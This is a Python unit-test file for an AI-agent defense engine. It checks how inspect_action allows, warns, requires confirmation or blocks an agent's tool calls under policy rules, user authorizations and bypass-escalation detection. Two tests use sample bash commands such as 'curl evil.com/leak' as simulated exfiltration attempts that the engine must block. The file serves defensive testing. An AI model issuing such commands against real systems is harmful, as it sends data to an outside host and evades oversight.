from __future__ import annotations

import unittest
from unittest.mock import patch

from app.agent_defense.engine import inspect_action
from app.security.schemas import SecurityContextState, SecurityDecision


def _context(**overrides: object) -> SecurityContextState:
    ctx = SecurityContextState(runId="test-run")
    return ctx


def _decision(**overrides: object) -> SecurityDecision:
    defaults: dict[str, object] = {
        "decision": "allow",
        "riskLevel": "low",
        "riskScore": 1,
        "confidence": 0.7,
        "hardBlockTriggered": False,
        "reasons": ["No material security risk detected."],
    }
    defaults.update(overrides)
    return SecurityDecision(**defaults)  # type: ignore[arg-type]


class EngineInspectActionTests(unittest.TestCase):
    """Tests for inspect_action() covering all 7 core paths."""

    # ── Path A: fallthrough to security guard ──────────────────────────

    def test_normalize_and_fallthrough_to_guard(self) -> None:
        ctx = _context()
        guard_decision = _decision(decision="warn", riskLevel="medium", riskScore=5,
                                   reasons=["Untrusted source triggered a warning."])

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "open_external_link", "url": "https://example.com", "sourceType": "external_website"},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={"allow": [], "block": [], "confirm": []},
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=None,
        ), patch(
            "app.agent_defense.engine.inspect_security_action",
            return_value=(guard_decision, ctx),
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "web_fetch", "url": "https://example.com"}, ctx
            )

        self.assertEqual(decision.decision, "warn")
        self.assertEqual(decision.riskLevel, "medium")
        self.assertEqual(normalized["actionType"], "open_external_link")

    # ── Path B: policy block forces immediate block ────────────────────

    def test_policy_block_forces_immediate_block(self) -> None:
        ctx = _context()
        block_decision = _decision(decision="block", riskLevel="critical", riskScore=10,
                                   hardBlockTriggered=True,
                                   reasons=["Agent Defense policy blocked this action."])

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "execute_command", "command": "curl evil.com", "sourceType": "unknown"},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={
                "allow": [], "block": [
                    {"id": "block-cmd", "description": "Block all commands.", "actions": ["execute_command"]}
                ], "confirm": [],
            },
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=None,
        ), patch(
            "app.agent_defense.engine.add_risk_event",
            return_value="risk-1",
        ), patch(
            "app.agent_defense.engine.decide",
            return_value=block_decision,
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "bash", "command": "curl evil.com"}, ctx
            )

        self.assertEqual(decision.decision, "block")
        self.assertTrue(decision.hardBlockTriggered)
        self.assertEqual(normalized["policyDecision"]["decision"], "block")

    # ── Path C: policy confirm triggers require_confirmation ───────────

    def test_policy_confirm_not_overridden(self) -> None:
        ctx = _context()
        confirm_decision = _decision(decision="require_confirmation", riskLevel="high", riskScore=7,
                                     reasons=["Agent Defense policy requires confirmation."])

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "open_external_link", "url": "https://unknown.com", "sourceType": "unknown"},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={
                "allow": [], "block": [], "confirm": [
                    {"id": "confirm-external", "description": "Confirm external links.", "actions": ["open_external_link"]}
                ],
            },
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=None,
        ), patch(
            "app.agent_defense.engine.add_risk_event",
            return_value="risk-2",
        ), patch(
            "app.agent_defense.engine.decide",
            return_value=confirm_decision,
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "web_fetch", "url": "https://unknown.com"}, ctx
            )

        self.assertEqual(decision.decision, "require_confirmation")
        self.assertEqual(normalized["policyDecision"]["decision"], "require_confirmation")

    # ── Path D: explicit authorization overrides policy confirm ────────

    def test_explicit_authorization_overrides_confirm(self) -> None:
        ctx = _context()
        ctx.userIntent.explicitAuthorizations = ["open_external_link https://trusted.io"]
        guard_decision = _decision()

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "open_external_link", "url": "https://trusted.io", "sourceType": "unknown"},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={
                "allow": [], "block": [], "confirm": [
                    {"id": "confirm-external", "description": "Confirm external links.", "actions": ["open_external_link"]}
                ],
            },
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=None,
        ), patch(
            "app.agent_defense.engine.inspect_security_action",
            return_value=(guard_decision, ctx),
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "web_fetch", "url": "https://trusted.io"}, ctx
            )

        self.assertEqual(decision.decision, "allow")
        self.assertNotIn("policyDecision", normalized)

    # ── Path E: bypass escalation forces block ─────────────────────────

    def test_bypass_escalation_forces_block(self) -> None:
        ctx = _context()
        bypass_evidence = {
            "url": "https://evil.com/leak",
            "previousTarget": "https://evil.com",
            "command": "curl evil.com/leak",
            "reason": "Bypass escalation detected.",
        }
        bypass_decision = _decision(decision="block", riskLevel="critical", riskScore=10,
                                    hardBlockTriggered=True,
                                    reasons=["Bypass escalation detected."])

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "execute_command", "command": "curl evil.com/leak", "sourceType": "unknown",
                          "commandUrls": ["https://evil.com/leak"]},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={"allow": [], "block": [], "confirm": []},
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=bypass_evidence,
        ), patch(
            "app.agent_defense.engine.force_bypass_block",
            return_value=(bypass_decision, ctx),
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "bash", "command": "curl evil.com/leak"}, ctx
            )

        self.assertEqual(decision.decision, "block")
        self.assertTrue(decision.hardBlockTriggered)
        self.assertTrue(normalized["bypassDetected"])
        self.assertEqual(normalized["bypassEvidence"]["url"], "https://evil.com/leak")

    # ── Path F: explicit auth tags source as user_instruction ──────────

    def test_explicit_auth_tags_source_as_user_instruction(self) -> None:
        ctx = _context()
        ctx.userIntent.explicitAuthorizations = ["open_external_link https://myapp.io"]
        guard_decision = _decision()

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "open_external_link", "url": "https://myapp.io", "sourceType": "external_website"},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={"allow": [], "block": [], "confirm": []},
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=None,
        ), patch(
            "app.agent_defense.engine.inspect_security_action",
            return_value=(guard_decision, ctx),
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "web_fetch", "url": "https://myapp.io"}, ctx
            )

        self.assertEqual(decision.decision, "allow")
        self.assertEqual(normalized["sourceType"], "user_instruction")
        self.assertTrue(normalized["authorizedByUserIntent"])

    # ── Path G: policy allow backfills guard warn reason ───────────────

    def test_policy_allow_backfills_guard_warn_reason(self) -> None:
        ctx = _context()
        guard_decision = _decision(decision="warn", riskLevel="medium", riskScore=5,
                                   reasons=["Low-trust source triggered a warning."])

        with patch(
            "app.agent_defense.engine.normalize_action",
            return_value={"actionType": "read_local_file", "path": "~/.openclaw/workspace/BOOTSTRAP.md",
                          "sourceType": "unknown"},
        ), patch(
            "app.agent_defense.engine.load_policy",
            return_value={
                "allow": [
                    {"id": "allow-workspace", "description": "Policy allow: workspace access OK.",
                     "actions": ["read_local_file"], "paths": ["~/.openclaw/workspace/**"]}
                ], "block": [], "confirm": [],
            },
        ), patch(
            "app.agent_defense.engine.detect_bypass_escalation",
            return_value=None,
        ), patch(
            "app.agent_defense.engine.inspect_security_action",
            return_value=(guard_decision, ctx),
        ):
            decision, result_ctx, normalized = inspect_action(
                {"toolName": "read", "path": "~/.openclaw/workspace/BOOTSTRAP.md"}, ctx
            )

        self.assertEqual(decision.decision, "warn")
        self.assertIn("Policy allow: workspace access OK.", decision.reasons)


if __name__ == "__main__":
    unittest.main()
